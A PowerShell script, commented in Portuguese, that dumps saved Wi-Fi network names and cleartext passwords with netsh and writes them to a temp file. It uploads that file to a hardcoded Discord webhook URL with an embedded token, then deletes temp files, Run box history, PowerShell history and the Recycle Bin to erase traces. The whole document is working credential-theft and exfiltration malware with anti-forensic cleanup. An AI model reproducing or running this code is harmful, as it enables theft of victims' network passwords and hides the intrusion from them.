############################################################################################################
Write-Output "Iniciando script de captura de Wi-Fi e upload para Discord..."

# Retrieve Wi-Fi profiles and passwords
Write-Output "Recuperando perfis Wi-Fi e senhas..."
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $_
} | ForEach-Object {
    (netsh wlan show profile name="$name" key=clear)
} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
    $pass = $_.Matches.Groups[1].Value.Trim()
    [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
}

# Formatar a saída em tabela e salvar em um arquivo temporário
$outputFilePath = "$env:TEMP\wifi-pass.txt"
$wifiProfiles | Format-Table -AutoSize | Out-String > $outputFilePath
Write-Output "Perfis Wi-Fi salvos em: $outputFilePath"

############################################################################################################
# Função para Upload do Arquivo para o Discord Webhook
function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [Parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $dc = "https://discord.com/api/webhooks/1305895921850253372/7QfqDObaSqRW_lZHkHSeGcpObjVs9TuGFT66OWHYRYP11XnKS6EE8zsSgFftudLgEP5m"

    Write-Output "Enviando informações para o Discord..."

    # Send the text content to Discord
    if (-not ([string]::IsNullOrEmpty($text))) {
        $Body = @{
            'username' = $env:username
            'content' = $text
        }
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Upload file to Discord if provided
    if (-not ([string]::IsNullOrEmpty($file))) {
        if (Test-Path -Path $file) {
            Write-Output "Arquivo encontrado, enviando para o Discord..."
            curl.exe -F "file1=@$file" $dc
        }
        else {
            Write-Output "Arquivo $file não encontrado."
        }
    }
}

# Executa o upload do arquivo para o Discord
Upload-Discord -file $outputFilePath

############################################################################################################
# Função para Limpar Arquivos Temporários e Histórico
function Clean-Exfil { 
    Write-Output "Limpando arquivos temporários e histórico..."

    # Empty temp folder
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

    # Delete Run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete PowerShell history
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path -Path $historyPath) {
        Remove-Item $historyPath -ErrorAction SilentlyContinue
    }

    # Empty Recycle Bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Executa a limpeza se o arquivo de senha foi enviado com sucesso
if (Test-Path -Path $outputFilePath) {
    Clean-Exfil
    Write-Output "Arquivo temporário de Wi-Fi removido."
} else {
    Write-Output "Arquivo temporário não encontrado, pulando limpeza."
}

# Remove o arquivo temporário de senhas
Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue

Write-Output "Script concluído."
############################################################################################################


